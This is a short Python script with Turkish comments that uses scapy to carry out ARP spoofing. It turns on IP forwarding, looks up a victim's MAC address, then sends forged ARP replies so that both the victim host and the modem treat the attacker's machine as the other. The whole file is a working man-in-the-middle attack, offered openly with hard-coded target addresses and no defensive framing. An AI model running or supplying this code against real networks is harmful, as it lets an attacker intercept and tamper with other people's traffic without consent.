import os
import scapy.all as scapy
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
def MacBulucu(ip):
    res_packet = scapy.ARP(pdst=ip)
    view_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    fake_packet = view_packet / res_packet
    packet = scapy.srp(fake_packet, timeout=2, verbose=False)[0]

    if len(packet) == 0:
        print("MAC bulunamadı")
    else:
        return (packet[0][1].hwsrc)


#ip1: Saldırı yapılacak IP
#ip2: Saldırgana paketin hangi IP'den geldiğini iddia edeceğimiz IP adresi.(Modem)
def ArpPaket(ip1,ip2):
    macadresi = MacBulucu(ip1)
    arp_paketi = scapy.ARP(op=2, pdst=ip1,hwdst=macadresi, psrc=ip2)
    scapy.send(arp_paketi, verbose=True)



ArpPaket("192.168.1.100","10.0.2.15")
#Şimdi ise modeme kurbanmışım paketi gönderiliyor.
ArpPaket("10.0.2.15","192.168.1.100")


